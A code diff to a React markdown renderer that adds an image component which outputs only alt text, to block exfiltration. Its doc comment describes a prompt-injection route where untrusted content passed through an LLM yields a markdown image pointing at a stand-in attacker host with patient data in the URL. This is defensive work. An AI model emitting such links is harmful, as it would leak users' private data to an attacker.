@@ -31,5 +31,18 @@ export function MarkdownLink({ href, children, ...props }) {
   );
 }
 
+/**
+ * Image renderer for ReactMarkdown. Never emits an <img> — markdown reaches the
+ * renderer from untrusted sources (uploaded documents, audio transcripts,
+ * collaborator messages) that flow through the LLM, so an injected
+ * `![](https://attacker/x?d=PHI)` would auto-fetch and exfiltrate data with no
+ * user interaction. The alt text is rendered as plain text instead.
+ */
+export function MarkdownImage({ alt, ...props }) {
+  // eslint-disable-next-line no-unused-vars
+  const { src, srcSet, title, width, height, loading, ...safeProps } = props;
+  return <span {...safeProps}>{alt || ''}</span>;
+}
+
 /** Components object for bare ReactMarkdown usages that only need link safety. */
-export const markdownLinkComponents = { a: MarkdownLink };
+export const markdownLinkComponents = { a: MarkdownLink, img: MarkdownImage };
